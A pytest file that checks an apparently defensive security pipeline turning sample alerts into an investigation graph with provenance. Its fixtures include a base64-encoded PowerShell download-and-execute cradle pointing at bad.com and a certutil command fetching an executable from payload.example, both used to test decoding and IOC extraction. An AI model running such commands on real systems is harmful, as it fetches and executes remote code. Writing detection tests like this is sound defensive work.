"""Phase 1 · Exit-Criteria Golden Integration Test.

Contract (2026-08-01 operator directive):

    Phase 1 is not complete until, for each of the four archetypal
    samples below, the pipeline produces a canonical Investigation
    Graph that can be visualised, whose every node/edge carries
    provenance, and where decoded artefacts and IOCs trace back to
    their originating evidence.

Samples covered:
    1. Cisco Secure Endpoint threat detection (JSON).
    2. Sysmon EventID-1 process creation with network + hashes (JSON).
    3. Encoded PowerShell submission (raw text).
    4. Generic JSON (unknown vendor) fallback.

For every sample this test asserts:

    * Pipeline stages executed in the LOCKED order (Addendum B).
    * The resulting `InvestigationGraph` contains the expected node
      kinds and relations for that archetype.
    * `assert_provenance(graph)` → every node has evidence_refs OR
      a vendor tag; every edge has evidence_refs.
    * `decoded_payloads_link_back(graph)` — decoded content always
      chains to its originating command via a `decoded_to` edge.
    * `iocs_link_to_evidence(graph)` — every URL / IP / hash / DNS
      node is either evidence-linked or edge-connected.
    * The Contract #11 acceptance check answers ≥ 4 questions for the
      thinnest sample (encoded PS) and ≥ 7 for the richest (Cisco).

The rendered graph tree is emitted to `phase1_graph_dumps/` as part
of the test run so operators can eyeball the artefact.
"""
from __future__ import annotations

import json
import os
from pathlib import Path

import pytest

from nivxforge.investigation.pipeline.contract_check import check_contract11
from nivxforge.investigation.pipeline.graph_visualise import (
    assert_provenance,
    decoded_payloads_link_back,
    iocs_link_to_evidence,
    render_tree,
)
from nivxforge.investigation.pipeline.orchestrator import run_phase1
from nivxforge.investigation.narrative_lexicon_gate import (
    assert_lexicon_clean, sanitize,
)


# ── Archetypal samples ───────────────────────────────────────────────

CISCO_SECURE_ENDPOINT = json.dumps({
    "id": "cse-1", "date": "2026-01-15T10:22:00Z",
    "event_type": "Threat Detected",
    "event_type_id": 1090519054,
    "detection": "W32.Emotet.Gen",
    "detection_id": "det-42",
    "connector_guid": "cg-1",
    "severity": "High",
    "threat_family": "Emotet",
    "computer": {
        "connector_guid": "cg-1",
        "hostname": "WKS-42",
        "operating_system": "Windows 10",
        "external_ip": "203.0.113.5",
    },
    "file": {
        "disposition": "Malicious",
        "file_name": "invoice.exe",
        "file_path": "C:/Users/John/Downloads/invoice.exe",
        "identity": {"sha256": "a" * 64, "md5": "b" * 32},
    },
    "network_info": {
        "remote_ip": "198.51.100.7",
        "remote_port": 443,
        "dirty_url": "http://bad.example/p1",
    },
    "command_line": {"arguments": "invoice.exe /silent /install"},
})

SYSMON_PROCESS_CREATE = json.dumps({
    "EventID": 1,
    "Computer": "host-alpha",
    "User": "CORP\\alice",
    "Image": "C:/Windows/System32/cmd.exe",
    "OriginalFileName": "cmd.exe",
    "CommandLine": "cmd.exe /c whoami && netstat -ano",
    "ParentImage": "C:/Windows/explorer.exe",
    "ParentCommandLine": "explorer.exe",
    "ProcessId": 1234,
    "ParentProcessId": 100,
    "ProcessGuid": "{p-guid-1}",
    "Hashes": "SHA256=" + "d" * 64 + ",MD5=" + "e" * 32,
    "IntegrityLevel": "Medium",
})

ENCODED_POWERSHELL = (
    "powershell.exe -EncodedCommand "
    "SQBFAFgAKAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAu"
    "AE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGE"
    "AZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwBiAGEAZAAuAGMAbw"
    "BtAC8AcAAxACcAKQAp"
)

GENERIC_JSON = json.dumps({
    "product": "Unknown Widget",
    "message": "Threat alert triggered",
    "cmdLine": "certutil -urlcache -f http://payload.example/x.exe C:\\x.exe",
    "meta": {"env": "prod"},
})


DUMP_DIR = Path("/tmp/phase1_graph_dumps")
DUMP_DIR.mkdir(exist_ok=True)


def _dump(name: str, state) -> None:
    """Write the rendered graph tree to disk for operator inspection."""
    tree = render_tree(state.graph)
    contract = check_contract11(state)
    header = (
        f"=== {name} ===\n"
        f"classification : {state.classification.kind}\n"
        f"vendor         : {state.vendor.vendor}  "
        f"(conf={state.vendor.confidence:.2f})\n"
        f"events         : {len(state.cem.events)}\n"
        f"graph nodes    : {len(state.graph.nodes)}\n"
        f"graph edges    : {len(state.graph.edges)}\n"
        f"contract11     : {contract.answered_count}/12 answered\n"
        f"validation     : {state.validation.summary()}\n\n"
    )
    (DUMP_DIR / f"{name}.txt").write_text(header + tree + "\n")


# ── Cisco Secure Endpoint ────────────────────────────────────────────

def test_phase1_exit_cisco_secure_endpoint():
    state = run_phase1(CISCO_SECURE_ENDPOINT)
    _dump("01_cisco_secure_endpoint", state)

    # Locked stage order verified
    stages = [t["stage"] for t in state.stage_trace]
    assert stages == [
        "input_classification", "parser", "vendor_detection",
        "vendor_normalization", "artifact_discovery",
        "recursive_decoder", "evidence_extraction",
        "investigation_graph", "evidence_validation",
    ]

    # Vendor identified correctly
    assert state.vendor.vendor == "cisco_secure_endpoint"
    assert state.cem.vendor_route == "cisco_secure_endpoint"

    # Expected node kinds present
    kinds = {n.kind for n in state.graph.nodes}
    assert {"host", "file", "hash", "url", "ip",
             "detection", "command"}.issubset(kinds), (
        f"missing kinds in Cisco graph: {sorted(kinds)}"
    )

    # Every node/edge has provenance
    assert_provenance(state.graph)
    assert iocs_link_to_evidence(state.graph)
    assert decoded_payloads_link_back(state.graph)

    # Detection is `flagged`-edge connected to host and to a process
    flagged_relations = {(e.from_id, e.to_id)
                          for e in state.graph.edges
                          if e.relation == "flagged"}
    assert flagged_relations, "detection missing `flagged` edges"

    # Contract #11 acceptance for a rich sample: ≥ 7 answers
    report = check_contract11(state)
    assert report.answered_count >= 7, (
        f"Cisco Secure Endpoint contract11 too low: {report.answered_count}"
    )


# ── Sysmon EID-1 ─────────────────────────────────────────────────────

def test_phase1_exit_sysmon_process_create():
    state = run_phase1(SYSMON_PROCESS_CREATE)
    _dump("02_sysmon_process_create", state)

    assert state.vendor.vendor == "sysmon"
    kinds = {n.kind for n in state.graph.nodes}
    assert {"host", "user", "process", "command", "hash"}.issubset(kinds), (
        f"missing kinds in Sysmon graph: {sorted(kinds)}"
    )

    # Parent → child command chain must exist
    child_edges = [e for e in state.graph.edges
                   if e.relation == "child_of"]
    assert child_edges, "sysmon parent→child linkage missing"

    # Every host/user/process has a `ran_by` or `executed_on` link
    relations = {e.relation for e in state.graph.edges}
    assert {"executed_on", "ran_by", "belongs_to"}.issubset(relations)

    assert_provenance(state.graph)
    assert iocs_link_to_evidence(state.graph)

    report = check_contract11(state)
    assert report.answered_count >= 5


# ── Encoded PowerShell ───────────────────────────────────────────────

def test_phase1_exit_encoded_powershell():
    state = run_phase1(ENCODED_POWERSHELL)
    _dump("03_encoded_powershell", state)

    # Encoded command must be recognised BEFORE it becomes plain_command
    assert state.classification.kind == "encoded_cmd"

    # At least one decoded layer + a URL surfaced from decoded content
    assert state.decoded, "no decoded layers produced"
    urls = state.evidence.by_kind("url")
    assert any("bad.com" in u.value for u in urls), (
        "URL from decoded PowerShell payload missing from evidence"
    )

    # Graph contains a decoded_payload node linked via `decoded_to`
    dp_nodes = state.graph.nodes_of("decoded_payload")
    assert dp_nodes, "no decoded_payload node in graph"
    assert decoded_payloads_link_back(state.graph)

    assert_provenance(state.graph)
    assert iocs_link_to_evidence(state.graph)

    report = check_contract11(state)
    assert report.answered_count >= 4


# ── Generic JSON fallback ────────────────────────────────────────────

def test_phase1_exit_generic_json_never_stops_pipeline():
    state = run_phase1(GENERIC_JSON)
    _dump("04_generic_json", state)

    # Even generic input must yield a well-formed state.
    assert state.vendor.vendor == "generic_json"
    assert state.cem.events, "generic fallback produced no events"

    # The certutil command surfaced as a command node
    kinds = {n.kind for n in state.graph.nodes}
    assert "command" in kinds, "certutil command node missing"

    # `certutil -urlcache -f http://payload.example/x.exe`
    # → URL evidence via artefact discovery
    urls = state.evidence.by_kind("url")
    assert any("payload.example" in u.value for u in urls), (
        "URL from generic JSON not surfaced by artefact discovery"
    )

    assert_provenance(state.graph)
    assert iocs_link_to_evidence(state.graph)


# ── Narrative lexicon gate ───────────────────────────────────────────

def test_lexicon_gate_rewrites_forbidden_terms():
    """Regression · operator directive 2026-08-01: the narrative must
    read like an analyst, never like an implementation walkthrough."""
    ugly = (
        "The pipeline received an artefact and routed it into the "
        "recursive decoder. After 5 decoder passes, the underlying "
        "command resolved to `SOC Challenge`. The verdict engine "
        "returned Suspicious at 56% confidence."
    )
    clean = sanitize(ugly)
    # No banned term survives
    assert "pipeline" not in clean.lower()
    assert "decoder" not in clean.lower()
    assert "verdict engine" not in clean.lower()
    assert "decoder passes" not in clean.lower()
    # And the rewrite is idempotent / gate-clean
    assert_lexicon_clean(clean)


def test_lexicon_gate_flags_survivors():
    """If a new prose surface leaks a banned term, the gate must
    raise `NarrativeLexiconError`."""
    from nivxforge.investigation.narrative_lexicon_gate import (
        NarrativeLexiconError,
    )
    with pytest.raises(NarrativeLexiconError):
        assert_lexicon_clean(
            "This report explains how the recursive decoder walked "
            "through 5 layers before the verdict engine finished."
        )
